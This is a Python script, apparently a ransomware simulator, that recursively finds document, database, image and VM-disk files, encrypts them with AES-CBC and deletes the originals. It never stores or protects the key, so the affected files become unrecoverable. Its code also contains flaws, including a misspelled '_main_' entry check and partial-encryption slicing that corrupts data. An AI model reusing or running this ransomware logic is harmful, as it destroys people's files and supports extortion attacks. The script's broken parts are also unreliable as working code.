import os
import json
from concurrent.futures import ThreadPoolExecutor
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

# Exclusions: Do not encrypt these files
exclusions = [
    r"D:\Cyber\Malware\Ransomware_Simulator\Ransim\public_key.pem",
    r"D:\Cyber\Malware\Ransomware_Simulator\Ransim\private_key.pem",
    r"D:\Cyber\Malware\Ransomware_Simulator\Ransim\script.py",
    r"D:\Cyber\Malware\Ransomware_Simulator\Ransim\descript.py",
    r"D:\Cyber\Malware\Ransomware_Simulator\Ransim\requirements.txt",
    r"D:\Cyber\Malware\Ransomware_Simulator\Ransim\ransomware_config.json"
]

# AES Encryption Configuration
def generate_aes_key():
    return get_random_bytes(32), get_random_bytes(16)

# Get file properties, especially size, using os.stat()
def get_file_properties(file_path):
    stat_info = os.stat(file_path)
    file_size = stat_info.st_size  # File size in bytes
    return file_size

# Decide whether to perform full or partial encryption based on file size or type
def should_partial_encrypt(file_size, file_extension):
    # Example logic: partial encrypt if file is larger than 50 MB or specific file types
    partial_encrypt_types = ['.doc', '.xls', '.sql', '.mdb', '.vmdk', '.png']
    return file_extension in partial_encrypt_types and file_size > (50 * 1024 * 1024)  # 50 MB

# Encrypt a small file (single-threaded)
def encrypt_small_file(file_path, aes_key, aes_iv, full_encrypt=True):
    with open(file_path, 'rb') as f:
        data = f.read()

    if not full_encrypt:  # Partial encryption, only encrypt first and last part
        split_point = len(data) // 2
        to_encrypt = data[:split_point] + data[-split_point:]
        remainder = data[split_point:-split_point]
    else:
        to_encrypt = data
        remainder = b""

    cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
    encrypted_data = cipher.encrypt(pad(to_encrypt, AES.block_size))

    encrypted_file = file_path + ".enc"
    with open(encrypted_file, 'wb') as ef:
        ef.write(aes_iv + encrypted_data + remainder)  # Append remainder if partially encrypted

    os.remove(file_path)  # Remove original file after encryption
    print(f"File '{file_path}' encrypted using single-threading. Full Encrypt: {full_encrypt}")

# Encrypt a chunk of a large file (multi-threaded)
def encrypt_chunk(chunk, aes_key, aes_iv):
    cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
    encrypted_chunk = cipher.encrypt(pad(chunk, AES.block_size))
    return aes_iv + encrypted_chunk

# Encrypt large file using multi-threading
def encrypt_large_file(file_path, aes_key, chunk_size=10 * 1024 * 1024, full_encrypt=True):
    aes_iv = get_random_bytes(16)
    file_size = get_file_properties(file_path)

    with open(file_path, 'rb') as f:
        chunks = []
        while True:
            chunk_data = f.read(chunk_size)
            if not chunk_data:
                break
            chunks.append(chunk_data)

    # Handle partial encryption
    if not full_encrypt:
        first_chunk = chunks[0]
        last_chunk = chunks[-1]
        chunks = [first_chunk] + chunks[1:-1] + [last_chunk]

    encrypted_file = file_path + ".enc"
    with ThreadPoolExecutor() as executor:
        encrypted_chunks = list(executor.map(lambda chunk: encrypt_chunk(chunk, aes_key, aes_iv), chunks))

    with open(encrypted_file, 'wb') as ef:
        for enc_chunk in encrypted_chunks:
            ef.write(enc_chunk)

    os.remove(file_path)  # Remove original file after encryption
    print(f"File '{file_path}' encrypted using multi-threading across {len(chunks)} chunks. Full Encrypt: {full_encrypt}")

# Function to search the directory for target files and encrypt based on file size and type
def search_and_encrypt_files(directory, exclusions, chunk_size=10 * 1024 * 1024):
    target_extensions = ['.doc', '.xls', '.sql', '.mdb', '.vmdk', '.png']  # Target file types
    aes_key, aes_iv = generate_aes_key()  # Generate AES key and IV

    for root, _, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            if any(file_name.endswith(ext) for ext in target_extensions):
                if file_path in exclusions:
                    continue

                file_size = get_file_properties(file_path)
                file_extension = os.path.splitext(file_name)[1]
                full_encrypt = not should_partial_encrypt(file_size, file_extension)

                if file_size <= chunk_size:
                    # Encrypt small file (single-threaded)
                    encrypt_small_file(file_path, aes_key, aes_iv, full_encrypt=full_encrypt)
                else:
                    # Encrypt large file (multi-threaded)
                    encrypt_large_file(file_path, aes_key, chunk_size=chunk_size, full_encrypt=full_encrypt)

# Main function to load JSON and execute encryption
def main():
    directory = r"D:\Cyber\Malware\Ransomware_Simulator\Ransim"  # Update this path with your target directory
    try:
        with open("ransomware_config.json", "r") as config_file:
            config = json.load(config_file)
        
        print("Available Ransomware Configurations:")
        for i, ransomware in enumerate(config.keys(), 1):
            print(f"{i}. {ransomware}")

        choice = input("Select the ransomware configuration (enter the number): ")
        
        if not choice.isdigit() or not (1 <= int(choice) <= len(config)):
            print("Invalid input. Please enter a valid number corresponding to the ransomware.")
            return
        
        selected_ransomware = list(config.keys())[int(choice) - 1]
        selected_settings = config[selected_ransomware]

        search_and_encrypt_files(directory, exclusions)  # Start encryption process
        print(f"Encryption completed using {selected_ransomware} settings.")
    except ValueError as ve:
        print("ValueError:", ve)
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "_main_":
    main()
